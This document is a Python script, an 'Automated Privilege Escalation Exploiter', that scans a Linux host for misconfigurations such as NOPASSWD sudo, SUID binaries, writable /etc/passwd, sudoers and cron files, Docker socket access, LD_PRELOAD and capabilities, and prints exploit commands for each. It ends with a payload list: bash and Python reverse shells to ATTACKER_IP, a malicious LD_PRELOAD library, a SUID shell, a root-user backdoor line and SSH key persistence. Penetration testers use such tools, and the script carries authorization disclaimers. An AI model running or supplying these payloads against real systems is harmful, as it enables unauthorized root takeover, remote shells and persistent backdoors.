"""
Automated Privilege Escalation Exploiter
‚ö†Ô∏è FOR EDUCATIONAL PURPOSES ONLY

This tool attempts to exploit common privilege escalation vulnerabilities.
NEVER use this on systems you don't own or without authorization.
"""

import os
import subprocess
import tempfile
from pathlib import Path
from typing import List, Dict


class PrivilegeEscalationExploiter:
    """Automated privilege escalation exploitation"""

    def __init__(self):
        self.current_user = os.getenv("USER")
        self.current_uid = os.getuid()

        print("=" * 60)
        print("‚ö†Ô∏è  PRIVILEGE ESCALATION EXPLOITER")
        print("‚ö†Ô∏è  FOR AUTHORIZED TESTING ONLY")
        print("=" * 60)
        print(f"\nüéØ Running as: {self.current_user} (UID: {self.current_uid})")
        print()

    def run_command(self, cmd: str) -> tuple:
        """Run command and return output, returncode"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Timeout", -1
        except Exception as e:
            return "", str(e), -1

    def check_root(self) -> bool:
        """Check if we have root"""
        return os.getuid() == 0

    def exploit_sudo_nopasswd(self):
        """Exploit NOPASSWD sudo entries"""
        print("[*] Attempting NOPASSWD sudo exploit...")

        stdout, stderr, returncode = self.run_command("sudo -l 2>&1")

        if "NOPASSWD" not in stdout:
            print("[-] No NOPASSWD entries found")
            return False

        # Parse sudo entries
        lines = stdout.split('\n')
        for line in lines:
            if "NOPASSWD" in line:
                print(f"[+] Found: {line}")

                # Try to extract command
                if "/bin/sh" in line or "/bin/bash" in line:
                    print("[+] Found shell access!")
                    print("[+] Run: sudo /bin/bash")
                    return True

                # Check for specific commands
                if "vim" in line.lower() or "vi" in line.lower():
                    print("[+] Found vim with sudo!")
                    print("[+] Exploit: sudo vim -c ':!sh'")
                    return True

                if "less" in line.lower() or "more" in line.lower():
                    print("[+] Found less/more with sudo!")
                    print("[+] Exploit: sudo less /etc/passwd then type !sh")
                    return True

                if "find" in line.lower():
                    print("[+] Found find with sudo!")
                    print("[+] Exploit: sudo find . -exec /bin/sh \\;")
                    return True

        return False

    def exploit_suid_find(self):
        """Exploit SUID find binary"""
        print("\n[*] Checking for SUID find...")

        stdout, stderr, returncode = self.run_command("find / -name find -perm -4000 2>/dev/null")

        if stdout:
            find_path = stdout.strip().split('\n')[0]
            print(f"[+] Found SUID find at: {find_path}")
            print(f"[+] Exploit command:")
            print(f"    {find_path} . -exec /bin/sh -p \\; -quit")
            return True

        print("[-] No SUID find found")
        return False

    def exploit_suid_vim(self):
        """Exploit SUID vim binary"""
        print("\n[*] Checking for SUID vim...")

        for vim_name in ["vim", "vi", "nvim"]:
            stdout, stderr, returncode = self.run_command(f"find / -name {vim_name} -perm -4000 2>/dev/null")
            if stdout:
                vim_path = stdout.strip().split('\n')[0]
                print(f"[+] Found SUID {vim_name} at: {vim_path}")
                print(f"[+] Exploit command:")
                print(f"    {vim_path} -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'")
                return True

        print("[-] No SUID vim found")
        return False

    def exploit_writable_passwd(self):
        """Exploit writable /etc/passwd"""
        print("\n[*] Checking if /etc/passwd is writable...")

        if os.access("/etc/passwd", os.W_OK):
            print("[+] /etc/passwd is writable!")
            print("[+] Exploit steps:")
            print("    1. Generate password hash:")
            print("       openssl passwd -1 -salt xyz password")
            print("    2. Add new root user:")
            print("       echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd")
            print("    3. Login as newroot")
            return True

        print("[-] /etc/passwd is not writable")
        return False

    def exploit_writable_sudoers(self):
        """Exploit writable sudoers"""
        print("\n[*] Checking if /etc/sudoers is writable...")

        if os.access("/etc/sudoers", os.W_OK):
            print("[+] /etc/sudoers is writable!")
            print("[+] Exploit command:")
            print(f"    echo '{self.current_user} ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers")
            return True

        print("[-] /etc/sudoers is not writable")
        return False

    def exploit_docker_socket(self):
        """Exploit Docker socket access"""
        print("\n[*] Checking Docker socket access...")

        if not os.path.exists("/var/run/docker.sock"):
            print("[-] Docker socket not found")
            return False

        if not os.access("/var/run/docker.sock", os.W_OK):
            print("[-] Docker socket not writable")
            return False

        print("[+] Docker socket is accessible!")
        print("[+] Exploit commands:")
        print("    # Method 1: Mount host filesystem")
        print("    docker run -v /:/hostfs -it alpine chroot /hostfs sh")
        print()
        print("    # Method 2: Run privileged container")
        print("    docker run --privileged -it alpine sh")
        print("    # Then inside container:")
        print("    nsenter --target 1 --mount --uts --ipc --net --pid -- bash")
        return True

    def exploit_writable_cron(self):
        """Exploit writable cron files"""
        print("\n[*] Checking for writable cron files...")

        cron_locations = [
            "/etc/crontab",
            "/etc/cron.d",
            "/var/spool/cron/crontabs"
        ]

        found = False
        for location in cron_locations:
            if os.path.exists(location):
                if os.path.isfile(location):
                    if os.access(location, os.W_OK):
                        print(f"[+] Writable cron file: {location}")
                        print(f"[+] Exploit:")
                        print(f"    echo '* * * * * root /bin/bash -c \"/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' >> {location}")
                        found = True
                elif os.path.isdir(location):
                    if os.access(location, os.W_OK):
                        print(f"[+] Writable cron directory: {location}")
                        print(f"[+] Exploit:")
                        print(f"    echo '* * * * * root /tmp/shell.sh' > {location}/exploit")
                        found = True

        if not found:
            print("[-] No writable cron files found")

        return found

    def exploit_ld_preload(self):
        """Exploit LD_PRELOAD sudo"""
        print("\n[*] Checking LD_PRELOAD sudo exploit...")

        stdout, stderr, returncode = self.run_command("sudo -l 2>&1")

        if "env_keep" in stdout.lower() and "ld_preload" in stdout.lower():
            print("[+] LD_PRELOAD is preserved in sudo!")
            print("[+] Exploit steps:")
            print("""
    1. Create malicious library (shell.c):
       #include <stdio.h>
       #include <sys/types.h>
       #include <stdlib.h>
       void _init() {
           unsetenv("LD_PRELOAD");
           setuid(0);
           setgid(0);
           system("/bin/sh");
       }

    2. Compile:
       gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

    3. Execute with sudo:
       sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>
            """)
            return True

        print("[-] LD_PRELOAD not exploitable via sudo")
        return False

    def exploit_capabilities(self):
        """Exploit dangerous capabilities"""
        print("\n[*] Checking for exploitable capabilities...")

        stdout, stderr, returncode = self.run_command("getcap -r / 2>/dev/null")

        if not stdout:
            print("[-] No capabilities found")
            return False

        found = False
        lines = stdout.strip().split('\n')
        for line in lines:
            if "cap_setuid" in line:
                binary = line.split()[0]
                print(f"[+] Found cap_setuid on: {binary}")
                if "python" in binary:
                    print(f"[+] Exploit:")
                    print(f"    {binary} -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'")
                    found = True

            if "cap_dac_override" in line:
                binary = line.split()[0]
                print(f"[+] Found cap_dac_override on: {binary}")
                print(f"[+] This allows bypassing file permissions")
                found = True

        if not found:
            print("[-] No exploitable capabilities found")

        return found

    def generate_payloads(self):
        """Generate useful payloads"""
        print("\n" + "=" * 60)
        print("USEFUL PAYLOADS")
        print("=" * 60)

        payloads = {
            "Reverse Shell (Bash)": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
            "Reverse Shell (Python)": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "SUID Shell (C)": """
// suid_shell.c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
// Compile: gcc suid_shell.c -o suid_shell
// Set SUID: chmod +s suid_shell
            """,
            "Add Root User": "echo 'hacker:$1$xyz$Lz.Tz4TGQKgXVQhGFCXgT/:0:0:root:/root:/bin/bash' >> /etc/passwd  # password: password",
            "SSH Key Persistence": "mkdir -p /root/.ssh; echo 'YOUR_PUBLIC_KEY' >> /root/.ssh/authorized_keys",
        }

        for name, payload in payloads.items():
            print(f"\n[{name}]")
            print(payload)

    def run_all_exploits(self):
        """Run all exploit checks"""
        print("\nüéØ Running exploitation checks...\n")

        exploits = [
            self.exploit_sudo_nopasswd,
            self.exploit_suid_find,
            self.exploit_suid_vim,
            self.exploit_writable_passwd,
            self.exploit_writable_sudoers,
            self.exploit_docker_socket,
            self.exploit_writable_cron,
            self.exploit_ld_preload,
            self.exploit_capabilities,
        ]

        successful = 0
        for exploit in exploits:
            try:
                if exploit():
                    successful += 1
            except Exception as e:
                print(f"[!] Error in {exploit.__name__}: {e}")

        print("\n" + "=" * 60)
        print(f"üìä Found {successful} potential exploit paths")
        print("=" * 60)

        self.generate_payloads()

        if self.check_root():
            print("\n‚úÖ You are already root!")
        else:
            print(f"\n‚ö†Ô∏è  Still running as {self.current_user} (UID: {self.current_uid})")


def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Automated Privilege Escalation Exploiter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
‚ö†Ô∏è  FOR AUTHORIZED TESTING ONLY
This tool attempts to exploit privilege escalation vulnerabilities.
NEVER use on systems you don't own or without authorization.
        """
    )

    args = parser.parse_args()

    exploiter = PrivilegeEscalationExploiter()
    exploiter.run_all_exploits()


if __name__ == "__main__":
    main()
